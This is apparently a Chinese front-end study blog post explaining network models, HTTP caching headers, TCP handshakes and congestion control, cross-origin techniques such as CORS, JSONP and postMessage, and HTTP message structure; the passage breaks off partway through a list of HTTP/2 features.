---
category: 前端
tags:
  - 基础
  - 计算机网络
date: 2019-06-21
title: 前端基础——计算机网络篇
---

前端基础之计算机网络，我们当今的互联网服务大部分基于HTTP协议，那么对于网络来说知其然也要知其所以然才对

<!-- more -->

# 网络模型
![network model](http://cdn.valtzhao.com/img/network_model.png)

- `TCP/IP 四层模型` 应用层、运输层、网际层和网络接口层。从实质上讲，只有上边三层，网络接口层没有什么具体的内容。HTTP 对应应用层。

- `OSI 七层模型` 应用层（Application）、表示层（Presentation）、会话层（Session）、传输层（Transport）、网络层（Network）、数据链路层（Data Link）、物理层（Physical）。HTTP 也是对应应用层。

- `五层模型` 应用层、运输层、网络层、数据链路层和物理层。

# 强缓存与协商缓存
## 强缓存
1.`Expires`：
服务器返回的一个时间，在这个时间之前都使用缓存，不发送`http`请求。

例如：`Expires: Thu, 10 Dec 2015 23:21:37 GMT`

缺点：服务器的时间和客户端不同会出现问题，老版本`http 1.0`中才使用，现在一般使用 `Cache-Contorl`。

2.`Cache-Control(优先级高)`：
声明一个相对的秒数，表示从现在起一段时间内缓存都有效，也不会发送`http`请求。

例如：`Cache-Control: max-age=3600`

`Cache-Control`可以控制是否校验`ETag`等协商缓存。`no-store`代表永远不缓存，每次都要向服务器请求新数据，是不会比较`ETag`的；而设置`no-cache`则是意味着不缓存过期的资源，所以每次还会向服务器确认资源是否修改，即通过`If-Modified-Since`或者`ETag`来校验资源是否发生变化，是`304`的来源。

## 协商缓存
1.`Last-Modified / If-Modified-Since`:
第一次请求一个资源时，服务器返回`Last-Modified`(例如：`Last-Modified: Mon, 30 Nov 2015 23:21:37 GMT`)，下一次请求是客户端带上`If-Modified-Since`的`header`。

例如`If-Modified-Since: Mon, 30 Nov 2015 23:21:37 GMT`，如果资源没改变则返回`304`状态码。

缺点：服务器可能频繁修改文件（ms级），而`Last-Modified`只能精确到秒，可能返回错误的状态码(已经变动却返回相同的时间)；服务器修改了文件但是内容没变化，只是修改时间变了，这个时候其实是不用更新缓存的，故而`ETag`更好。

2.`ETag / If-None-Match(优先级高)`:
用一个`ETag`标记服务器的文件(可以用`hash`之类的算法计算)，如果`ETag`没变则服务器返回 `304`状态码。

> 补充，ETag的hash计算算法，

例如：服务器返回：`ETag: "d41d8cd98f00b204e9800998ecf8427e"`；客户端发送：`If-None-Match: "d41d8cd98f00b204e9800998ecf8427e"`

# TCP
## 三次握手建立连接
![TCP connect](http://cdn.valtzhao.com/img/tcp_connect.png)

1. 客户端请求建立`TCP`连接，标记`SYN(Synchronize Sequence Numbers，同步序列号)`为`1`，并发送客户端的序列号`x`，即`SYN=1;seq=x`。发送完毕后，客户端进入`SYN_SEND`状态。
2. 服务器收到后，标记`ACK(Acknowledgement)`为`1`，返回一个确认码`ack`，值为客户端序列号`加1`，并发送自己的同步序列号`y`给客户端，即`SYN=1;seq=y;ACK=1;ack=x+1`。发送完毕后，服务器端进入`SYN_RCVD`状态，一段时间后没收到回复，自动尝试**5**次重新发送确认报文，每次时间间隔指数递增`(1s,2s,4s,8s,16s)`，第**5**次后等待`31s`后`(总共 63s)`才能断开连接。
3. 客户端收到后需要告知服务器它收到了，同样发送确认码和序列号，即`ACK=1;ack=y+1;seq=x+1`。发送完毕后，客户端进入`ESTABLISHED`状态，当服务器端接收到这个包时，也进入 `ESTABLISHED`状态，`TCP`握手结束。
> 注意：客户端发送每次`TCP`报文时`seq`都会递增`1`，便于收到报文后确认报文发送的先后顺序。第三次握手不需要发送`SYN=1`信号，因为不是初始建立连接状态，如果标记为`1`那么服务器又会认为是建立一个新连接了。

## 四次握手关闭连接(以客户端发起关闭为例)
![TCP finis](http://cdn.valtzhao.com/img/tcp_finish.png)

1. 客户端请求关闭连接，标记`FIN(finish)`标记为`1`，带上序列号`u`，这个时候客户端还可以接收数据但是不再发送数据了。
2. 服务器收到请求后标记`ACK`为`1`，返回确认码`u+1`，告诉客户端它收到了，服务器开始关闭连接（发送剩余数据等等操作）。
3. 服务器等待关闭后(需要把没发完的发完)，向客户端发起关闭请求，标记`FIN`为`1`，序列号为 `w`，这个时候服务器也不发送数据了。
4. 客户端收到确认后，知道服务器关闭了，那么自己也不再接受数据了，标记`ACK`为`1`，发送确认码`w+1`，进入等待阶段，等待`2MSL(Maximum Segment Lifetime，最大报文生存周期)`，保证服务器收到确认并已关闭了，客户端才可以放心关闭，如果继续收到服务器的数据，说明确认码未收到，需要再次向服务器发送，这就是等待`2MSL`的原因。
> 需要四次握手的原因，建立连接时服务器返回确认码时可以同时传输序列号`SYN`，但是关闭连接时服务器可能还有剩余数据需要发送，所以先回复一个`ACK`告诉客户端它知道该关闭了只是需要做一些收尾，等到收尾工作做完（发送完剩余数据），再告诉客户端可以关闭了。

## SYN 攻击
在三次握手过程中，服务器发送`SYN-ACK`之后，收到客户端的`ACK`之前的`TCP`连接称为`半连接(half-open connect)`。此时服务器处于`SYN_RCVD`状态。当收到`ACK`后，服务器才能转入 `ESTABLISHED`状态.

`SYN攻击`指的是，攻击客户端在短时间内伪造大量不存在的`IP`地址，向服务器不断地发送`SYN`包，服务器回复确认包，并等待客户的确认。由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的`SYN`包将长时间占用未连接队列，正常的`SYN`请求被丢弃，导致目标系统运行缓慢，严重者会引起网络堵塞甚至系统瘫痪。

`SYN攻击`是一种典型的`DoS/DDoS`攻击。防御可以`限制最大半连接数`、`网关过滤`、`缩短超时时间`等等。

## 滑动窗口
先来了解一下前提：

`TCP`协议的两端分别为发送者`A`和接收者`B`，由于是全双工协议，因此`A`和`B`应该分别维护着一个独立的`发送缓冲区`和`接收缓冲区`，由于对等性（`A`发`B`收和`B`发`A`收），我们以`A`发送 `B`接收的情况作为例子；

发送窗口是发送缓存中的一部分，是可以被`TCP`协议发送的那部分，其实应用层需要发送的所有数据都被放进了发送者的发送缓冲区；

发送窗口中相关的有四个概念：
- 已发送并收到确认的数据（不再发送窗口和发送缓冲区之内）
- 已发送但未收到确认的数据（位于发送窗口之中）
- 允许发送但尚未发送的数据
- 发送窗口外发送缓冲区内暂时不允许发送的数据

### 流程

`TCP`建立的开始，`B`会告诉`A`自己的接受窗口大小，比如`20`。

`A`发送`11`个字节后，发送窗口位置不变，`B`接收到了乱序的数据分组：

![TCP Slide 1](http://cdn.valtzhao.com/img/tcp_slide1.png)

只有当`A`成功发送了数据，即发送的数据得到了`B`的确认之后，才会移动滑动窗口离开已发送的数据；同时`B`则确认连续的数据分组，对于乱序的分组则先接收下来，避免网络重复传递：

![TCP Slide 2](http://cdn.valtzhao.com/img/tcp_slide2.png)

### 流量控制
流量控制方面主要有两个要点需要掌握。一是`TCP`利用滑动窗口实现流量控制的机制；二是如何考虑流量控制中的传输效率。

1.流量控制

所谓流量控制，主要是接收方传递信息给发送方，使其不要发送数据太快，是一种端到端的控制。主要的方式就是返回的`ACK`中会包含自己的接收窗口的大小，并且利用大小来控制发送方的数据发送。

这里面涉及到一种情况，如果`B`已经告诉`A`自己的缓冲区已满，于是`A`停止发送数据；等待一段时间后，`B`的缓冲区出现了富余，于是给`A`发送报文告诉`A`我的`rwnd`大小为`400`，但是这个报文不幸丢失了，于是就出现`A`等待`B`的通知`B`等待`A`发送数据的死锁状态。为了处理这种问题，`TCP`引入了`持续计时器（Persistence timer）`，当`A`收到对方的零窗口通知时，就启用该计时器，时间到则发送一个`1`字节的探测报文，对方会在此时回应自身的接收窗口大小，如果结果仍未`0`，则重设持续计时器，继续等待。

2.传递效率

单个发送字节单个确认，窗口有一个空余就通知对方，这未免也太浪费性能了，所以确认一般是批量确认一部分连续的，而窗口要等到空余较多的时候才通知对方发送。

对于单发字节确认问题：
使用`Nagle`算法：

1. 要发送一段数据时候，先发送第一个数据字节，后面的数据先缓存。
2. 等到收到确认后了解接收方的可接收窗口大小，再根据这个大小组织数据发送出去。
3. 等到发送的数据有一半收到确认回复或者达到报文最大长度时，发送一个报文段。

对于`窗口空余问题`：
让接收方等待一段时间，或者接收方获得足够的空间容纳一个报文段或者等到接受缓存有一半空闲的时候，再通知发送方发送数据。

### 拥塞控制
拥塞控制就是防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。常用的方法就是：

1. 慢开始、拥塞控制：

通过图我们来一步步解释：

![TCP Slow Start](http://cdn.valtzhao.com/img/tcp_slow_start.png)

发送方维持一个`“拥塞窗口”(cwnd,congestion window)`的变量，与发送方的`允许窗口大小(rwnd,receiver window)`共同决定发送窗口大小，显然`cwnd`是不能超过`rwnd`的。
当开始发送数据时，避免一下子将大量字节注入到网络，造成或者增加拥塞，选择发送一个`1`字节的试探报文，收到确认后尝试发送`2`字节，收到确认再发`4`字节，等等，以此类推，以`2`的指数级增长。
最后回达到一个`门限(ssthresh)`，规则如下：
- `cwnd` < `ssthresh`: 继续`2`的指数增长。
- `cwnd` >= `ssthresh`: 拥塞避免方法，每次窗口大小只增加`1`，而不是`2`的指数级增长。
当出现拥塞时，比如丢包，也就是可能这个`门限(ssthresh)`可能设置**过大**了，那么把门限减少为原来的一半`(ssthresh/2)`，同时`cwnd`设为`1`，重新开始指数级增长`(慢开始)`。

2. 快重传、快恢复：

![TCP Fast Restore](http://cdn.valtzhao.com/img/tcp_fast_start.png)

- 接收方建立这样的机制，如果一个包丢失，则对后续的包继续发送针对该包的重传请求。
- 一旦发送方接收到三个一样的确认，就知道该包之后出现了错误，立刻重传该包。
- 此时发送方开始执行“快恢复”算法：
> 门限设为一半，cwnd 直接从减少后的门限开始，即 ssthresh/2，之后每次收到确认递增 1 直到达到接收方的最大接收窗口大小(rwnd)。这种方式能比较快的恢复传输，而不必要重新等待 TCP 的慢开始，现在 TCP 都是基于快重传的机制了，在 TCP Tahoe 版本是使用慢开始的，从 TCP Reno 版本开始使用快重传。

## 跨域
1. `DOM`同源策略：禁止对不同源页面`DOM`进行操作。这里主要场景是`iframe`跨域的情况，不同域名的`iframe`是限制互相访问的。
2. `XMLHttpRequest`同源策略：禁止使用`XHR`对象向不同源的服务器地址发起`HTTP`请求。
只要`协议`、`域名`、`端口`有任何一个不同，都被当作是不同的**域**，之间的请求就是**跨域**操作。

### 为什么要有跨域限制
`AJAX`同源策略主要用来防止`CSRF`攻击。如果没有`AJAX`同源策略，相当危险，我们发起的每一次`HTTP`请求都会带上请求地址对应的`cookie`，恶意网站模拟这个请求(拿到了用户登录过网站的 cookie)后就可以做一些坏事情了。

> `CSRF(Cross-site request forgery)`跨站请求伪造：跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。

### 跨域解决方式
#### 跨域资源共享`CORS`(cross origin resource sharing)
`CORS`需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，`IE`浏览器不能低于`IE10`。

实现`CORS`通信的关键是服务器。只要服务器实现了`CORS`接口，就可以跨源通信。

#### 两种请求
浏览器将`CORS`请求分成两类：简单请求（`simple request`）和非简单请求（`not-so-simple request`）。
只要同时满足以下两大条件，就属于简单请求。

1. 请求方法是以下三种方法之一：`HEAD`，`GET`，`POST`。
2. `HTTP`的头信息不超出以下几种字段：`Accept`，`Accept-Language`，`Content-Language`，`Last-Event-ID`，`Content-Type`(只限于三个值 `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`)。

#### 简单请求
对于简单请求，浏览器直接发出`CORS`请求。具体来说，就是在头信息之中，增加一个`Origin`字段。

如果`Origin`指定的源，不在许可范围内，服务器会返回一个正常的`HTTP`回应。浏览器发现，这个回应的头信息没有包含`Access-Control-Allow-Origin`字段（详见下文），就知道出错了，从而抛出一个错误，被`XMLHttpRequest`的`onerror`回调函数捕获。注意，这种错误无法通过状态码识别，因为`HTTP`回应的状态码有可能是`200`。

如果`Origin`指定的域名在许可范围内，服务器返回的响应，会**多出几个头信息字段**。

可能有的人会觉得那`Origin`的头部不是可以修改为服务器允许的源来完成危险的跨域请求么？需要注意的是，浏览器在内部会禁止修改`Origin`头部。

- `Access-Control-Allow-Origin`, 该字段是必须的。它的值要么是请求时`Origin`字段的值，要么是一个`*`，表示接受任意域名的请求。

- `Access-Control-Allow-Credentials`, 该字段可选。它的值是一个布尔值，表示是否允许发送`Cookie`。默认情况下，`Cookie`不包括在 `CORS`请求之中。设为`true`，即表示服务器明确许可，`Cookie`可以包含在请求中，一起发给服务器。这个值也只能设为`true`，如果服务器不要浏览器发送`Cookie`，删除该字段即可。

- `Access-Control-Expose-Headers`, 该字段可选。`CORS`请求时，`XMLHttpRequest`对象的`getResponseHeader()`方法只能拿到`6`个基本字段：`Cache-Control`、`Content-Language`、`Content-Type`、`Expires`、`Last-Modified`、`Pragma`。如果想拿到其他字段，就必须在`Access-Control-Expose-Headers`里面指定。

`CORS`请求默认不发送`Cookie`和`HTTP`认证信息。如果要把`Cookie`发到服务器，一方面要服务器同意，指定`Access-Control-Allow-Credentials`字段为`true`且 `Access-Control-Allow-Origin`不能设为星号，同时在`AJAX`请求中打开`withCredentials`属性。

#### 非简单请求
非简单请求是那种对服务器有特殊要求的请求，比如请求方法是`PUT`或`DELETE`，或者 `Content-Type`字段的类型是`application/json`。

**非简单请求的`CORS`请求，会在正式通信之前，增加一次`HTTP`查询请求，称为”预检”请求（preflight）。**

“预检”请求用的请求方法是`OPTIONS`，表示这个请求是用来询问的。头信息里面，关键字段是 `Origin`，表示请求来自哪个源。

除了`Origin`字段，”预检”请求的头信息包括两个特殊字段。

- `Access-Control-Request-Method`, 该字段是必须的，用来列出浏览器的`CORS`请求会用到哪些`HTTP`方法

- `Access-Control-Request-Headers`, 该字段是一个逗号分隔的字符串，指定浏览器`CORS`请求会额外发送的头信息字段

“预检” 返回的结果除了`Access-Control-Allow-Origin`和 `Access-Control-Allow-Credentials`与简单请求一样，还多两个字段：

1. `Access-Control-Allow-Methods`：该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。 
2. `Access-Control-Max-Age`：该字段可选，用来指定本次预检请求的有效期，单位为秒。例如 `1728000`，即允许缓存该条回应`1728000`秒（即`20`天），在此期间，不用发出另一条预检请求。

#### jsonp
动态添加一个`<script>`标签，而`script`标签的`src`属性是没有跨域的限制的。
```html
<script type="text/javascript">
        function jsonpCallback(result) {
            alert(result.msg);
        }
</script>

//告诉服务器端的js代码这边的回调函数是jsonpCallback，下载的js文件会直接运行，运行回调函数把数据传回来
<script type="text/javascript" src="http://crossdomain.com/jsonServerResponse?jsonp=jsonpCallback"></script>
```

- 优点：它不像`XMLHttpRequest`对象实现的`Ajax`请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都可以运行，不需要`XMLHttpRequest`或`ActiveX`的支持；并且在请求完毕后可以通过调用`callback`的方式回传结果。

- 缺点：它只支持`GET`请求而不支持`POST`等其它类型的`HTTP`请求；它只支持跨域`HTTP`请求这种情况，不能解决不同域的两个页面之间如何进行`JavaScript`调用的问题。

#### 服务器代理
浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所要域的资源再返回给客户端。

**服务器代理是万能的。**

#### document.domain
对于主域名相同，而子域名不同的情况，可以使用`document.domain`来跨域 这种方式非常适用于 `iframe`跨域的情况，主域名指的是一级域名（如：`baidu.com`，`qq.com`而不是 `www.baidu.com`之类的），跨域的时候需要两边都设置`document.domain = ***`。

#### window.name
页面如果设置了`window.name`，那么在不关闭页面的情况下，即使进行了页面跳转 `location.href=...`，这个`window.name`还是会保留。

利用`window.name`的性质，我们可以在`iframe`中加载一个跨域页面。这个页面载入之后，让它设置自己的`window.name`，然后再让它进行当前页面的跳转，跳转到与`iframe`外的页面同域的页面，此时`window.name`是不会改变的。这样，`iframe`内外就属于同一个域了，且 `window.name`还是跨域的页面所设置的值。
```javascript
//a页面的代码
iframe = document.createElement('iframe')
iframe.style.display = 'none'
var state = 0

iframe.onload = function() {
  if (state === 1) {
    //第二次监听onload，说明iframe已经第二次跳转和当前域一样了，这时候可以取window.name的值了
    var data = iframe.contentWindow.name
    console.log(data)
    iframe.contentWindow.document.write('')
    iframe.contentWindow.close()
    document.body.removeChild(iframe)
  } else if (state === 0) {
    state = 1
    iframe.contentWindow.location = 'http://m.zhuanzhuan.58.com:8887/b.html'
  }
}
document.body.appendChild(iframe)

//b页面代码
window.name = 'hello'
```
#### location.hash
很少用，和`window.name`一样，因为子`iframe`有修改父框架的`location.hash`的权限，从而传递值，不过大小有限。
```javascript
//a页面代码相同
//b页面
parent.location.hash = 'hello'
```
#### postMessage 实现页面间通信
语法：`otherWindow.postMessage(message, targetOrigin, [transfer])`
```javascript
window.addEventListener("message", receiveMessage, false)

function receiveMessage(event) {
  //some code
}
```
如果不是使用`window.open()`打开的页面或`iframe`嵌入的页面，就跟当前页面扯不上任何关系，是无法使用`window.postMessage()`进行跨域通信的！

`window.postMessage()`中的`window`始终是你要通信的目标页面的`window`，也就是`PageA` 想法发送信息到`PageB`那么这个`window`就是`PageB`的`window`即`iframe.contentWindow`，相反就是`top`或`parent`。

一个很方便的回复消息的方式就是通过`event.source`来回复，`event.source`就是发送消息的窗体。

# HTTP
## 浏览器输入url发生了啥？
首先让我们从一个问题入手，当我们在浏览器中输入 `http://www.baidu.com/` 访问百度的时候浏览器做了哪些事情。(这里以 `Chrome` 浏览器为例)

1. 首先 `Chrome` 搜索自身的 `DNS` 缓存。(如果 `DNS` 缓存中找到百度的 `IP` 地址，就跳过了接下来查找 `IP` 地址步骤，直接访问该 `IP` 地址。)
2. 搜索操作系统自身的 `DNS` 缓存。(浏览器没有找到缓存或者缓存已经失效)
3. 读取硬盘中的 `host` 文件，里面记录着域名到 `IP` 地址的映射关系，`Mac` 电脑中位于 `/etc/hosts`。(如果前1.2步骤都没有找到)
4. 浏览器向宽带运营商服务器或者域名服务器发起一个 `DNS` 解析请求，这里服务器有**两种方式解析请求**，这在稍后会讲到，之后浏览器获得了百度首页的 `IP` 地址。
5. 拿到 `IP` 地址后，浏览器就向该 `IP` 所在的服务器建立 `TCP` 连接(即三次握手)。
6. 连接建立起来之后，浏览器就可以向服务器发起 `HTTP` 请求了。(这里比如访问百度首页，就向服务器发起 `HTTP` 中的 `GET` 请求)
7. 服务器接受到这个请求后，根据路径参数，经过后台一些处理之后，把处理后的结果返回给浏览器，如果是百度首页，就可以把完整的 `HTML` 页面代码返回给浏览器。
8. 浏览器拿到了百度首页的完整 `HTML` 页面代码，内核和 `JS` 引擎就会解析和渲染这个页面，里面的 `JS`，`CSS`，图片等静态资源也通过一个个 `HTTP` 请求进行加载。
9. 浏览器根据拿到的资源对页面进行渲染，最终把完整的页面呈现给用户。
10. 如果浏览器没有后续的请求，那么就会跟服务器端发起 `TCP` 断开(即四次挥手)。

上面提到，服务器在接受 `DNS` 解析请求的时候一般会有两种处理方式，它们分别是**递归名称解析**和**迭代名称解析**，具体是什么可简单参考下面的解释，觉得内容太多可跳过
> **递归名称解析**：用户在向根名称服务器发送请求如图中为访问网址为`ftp.cs.vu.nl`之后就不用管后续的请求了，该服务器知道 `nl` 服务器地址，并向其询问其子域 `ftp.cs.vu` 的地址，之后不断递归，最终返回给用户最终的 `IP` 地址。
>
> **迭代名称解析**：客户端向根名称服务器发送查询 `ftp.cs.vu.nl` 的地址时候，根名称服务器只知道 `nl` 地址，它并不管后续的请求，而是将该地址直接返回给用户，而用户在获得地址后继续向 `nl` 结点服务器询问` ftp.cs.vu `的地址。相当于后续查询需要自己用户来完成，最后拿到 `ftp.cs.vu.nl`的 `IP` 地址。

> 文章尾部有DNS解析的概念解析，[点我]()

## `HTTP`基本概念
`HTTP`，全称为` HyperText Transfer Protocol`，即为超文本传输协议。是互联网应用最为广泛的一种网络协议，所有的 `www` 文件都必须遵守这个标准。

### `HTTP`特性
- `简单快速`，客户向服务器请求服务时，只需传送请求方法和路径。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。
- `灵活`：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。
- `无连接`：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。
- `无状态`：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。
- 一般构建基于`TCP/IP`，默认端口80

### `HTTP`的URL
HTTP使用`统一资源标识符`（Uniform Resource Identifiers, URI）来传输数据和建立连接。`URL`是一种特殊类型的`URI`，包含了用于查找某个资源的足够的信息。`URL`,全称是UniformResourceLocator, 中文叫`统一资源定位符`,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成：
> http://www.valtzhao.com:8080/news/index.asp?boardID=5&ID=24618&page=1#name

1. 协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在"HTTP"后面的“//”为分隔符
2. 域名部分：该URL的域名部分为“www.valtzhao.com”。一个URL中，也可以使用IP地址作为域名使用
3. 端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口
4. 虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”
5. 文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名
6. 锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分
7. 参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&ID=24618&page=1”。参数可以允许有多个参数，参数与参数之间用“&”作为分隔符。

### `HTTP`请求
`HTTP` 定义了在与服务器交互的不同方式，最常用的方法有 `4` 种，分别是 `GET`，`POST`，`PUT`， `DELETE`。一个 `URL` 地址，对应着一个网络上的资源，而 `HTTP` 中的 `GET`，`POST`，`PUT`，`DELETE` 就对应着对这个资源的查询，修改，增添，删除4个操作。

`HTTP` 请求由 3 个部分构成，分别是：`状态行`，`请求头`(Request Header)，`请求正文`。

![http_request_struct](http://cdn.valtzhao.com/img/http_request_struct.png)

#### `GET`请求
```http
GET /562f25980001b1b106000338.jpg HTTP/1.1
Host    img.mukewang.com
User-Agent  Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36
Accept  image/webp,image/*,*/*;q=0.8
Referer http://www.imooc.com/
Accept-Encoding gzip, deflate, sdch
Accept-Language zh-CN,zh;q=0.8
```
一共有四部分，我们分别讲解：
1. `请求行`，用来说明请求类型,要访问的资源以及所使用的HTTP版本
2. `请求头部`，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息
3. `空行`，请求头部后面的空行是必须的
4. 请求数据也叫`主体`，可以添加任意的其他数据。上面的例子没有请求体

#### `POST`请求
```http
POST / HTTP1.1
Host:www.wrox.com
User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)
Content-Type:application/x-www-form-urlencoded
Content-Length:40
Connection: Keep-Alive

name=Professional%20Ajax&publisher=Wiley
```
这是一个比较完整并简短的`POST`请求

#### `GET`和`POST`区别
1. `GET`的请求数据放在URL的参数部分，而`POST`可以放在请求主体中，比起前者安全一些
2. `GET`提交的数据大小有限制，后者没有
3. `GET` 请求可以被缓存，可以被收藏为书签，但 `POST` 可以被缓存，但不能被收藏为书签
### `HTTP`响应
HTTP响应也由四个部分组成，分别是：`状态行`、`消息报头`、`空行`和`响应正文`。
```http
HTTP/1.1 200 OK
Date: Fri, 22 May 2009 06:07:21 GMT
Content-Type: text/html; charset=UTF-8

<html>
      <head></head>
      <body>
            <!--body goes here-->
      </body>
</html>
```
1. `状态行`，由`HTTP协议版本号`，` 状态码`， `状态消息` 三部分组成。
2. `消息报头`，用来说明客户端要使用的一些附加信息
3. `空行`，消息报头后面的空行是必须的
4. `响应正文`，服务器返回给客户端的文本信息。本例中是`HTML`

### `HTTP`响应码
这里只总结一些常见的
- 200 OK 客户端请求成功。
- 301 Moved Permanently 请求永久重定向。
- 302 Moved Temporarily 请求临时重定向。
- 304 Not Modified 文件未修改，可以直接使用缓存的文件。
- 400 Bad Request 由于客户端请求有语法错误，不能被服务器所理解。
- 401 Unauthorized 请求未经授权，无法访问。
- 403 Forbidden 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因。
- 404 Not Found 请求的资源不存在，比如输入了错误的URL。
- 500 Internal Server Error 服务器发生不可预期的错误，导致无法完成客户端的请求。
- 503 Service Unavailable 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常。

### `HTTP`请求头解读
这里列一些常用的请求头：
- `Accept`：指定客户端能够接收的内容类型，如常见的 `text/html` 等，最后返回的百度首页也是个 `HTML` 文件。
- `Accept-Encoding`：表示浏览器有能力解码的编码类型。比如`gzip`
>gzip是 GNU zip 的缩写，它是一个 GNU 自由软件的文件压缩程序，也经常用来表示 gzip 这种文件格式。
>
>deflate是同时使用了 LZ77 算法与哈夫曼编码（Huffman Coding）的一个无损数据压缩算法。
- `Accept-Language`：表示浏览器所支持的语言类型
- `Cache-Control`：指定请求和响应遵循的缓存机制。比如`no-cache`就是无缓存
- `Connection`：表示是否需要持久连接。（HTTP 1.1 默认进行持久连接即为 keep-alive, HTTP 1.0 则默认为 close）
- `Cookie`：用于会话追踪
- `Host`：表示请求的服务器网址
- `User-Agent`：用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户端使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等
- `Content-Length`: 请求的内容长度
- `Referer`: 先前访问的网页的地址，当前请求网页紧随其后，说明你是先前是从哪个网址点击访问到该页面的，如果没有则不填
- `Content-Type`：内容的类型，`GET ``请求无该字段，POST` 请求中常见的有 `application/x-www-form-urlencoded `为普通的表单提交，还有文件上传为 `multipart/form-data`

### `HTTP`响应头解读
- `Date`：原始服务器消息发出的时间
- `Last-Modified`：请求资源的最后修改时间
- `Expires`：响应过期的日期和时间，如果下次访问在时间允许的范围内，可以不用重新请求，直接访问缓存
- `Set-Cookie`: 设置`Http Cookie`，下次浏览器再次访问的时候会带上这个 `Cookie` 值
- `Server`：服务器软件名称，常见的有 `Apache` 和 `Nginx`

## `HTTP/1.0`, `HTTP/1.1`与`HTTP/2.0`比较
要知道HTTP为何升级，要知道是什么影响了HTTP的效率。影响一个 HTTP 网络请求的因素主要有两个：`带宽`和`延迟`。延迟又包括`浏览器阻塞`，`DNS查询耗时`以及`TCP链接建立`等。

### `HTTP1.0`和`HTTP1.1`的一些区别
1. `缓存处理`，在`HTTP1.0`中主要使用header里的`If-Modified-Since`,`Expires`来做为缓存判断的标准，`HTTP1.1`则引入了更多的缓存控制策略例如`Entity tag`，`If-Unmodified-Since`, `If-Match`, `If-None-Match`等更多可供选择的缓存头来控制缓存策略。

2. `带宽优化及网络连接的使用`，`HTTP1.0`中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能；`HTTP1.1`则在请求头引入了`range`头域，它允许只请求资源的某个部分，即返回码是`206（Partial Content）`，这样就方便了开发者自由的选择以便于充分利用带宽和连接。

3. `错误通知的管理`，在`HTTP1.1`中新增了`24`个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。

4. `Host头处理`，在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。`HTTP1.1`的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。

5. `长连接`，HTTP 1.1支持`长连接`（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送**多个HTTP请求和响应**，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启`Connection： keep-alive`，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。

### `HTTP2.0`和`HTTP1.X`相比的新特性
1. `新的二进制格式（Binary Format）`，`HTTP1.x`的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合。基于这种考虑`HTTP2.0`的协议解析决定采用二进制格式，实现方便且健壮。

2. `多路复用（MultiPlexing）`，即连接共享，即每一个`request`都是是用作连接共享机制的。一个`request`对应一个`id`，这样一个连接上可以有多个`request`，每个连接的`request`可以随机的混杂在一起，接收方可以根据`request`的 `id`将`request`再归属到各自不同的服务端请求里面。
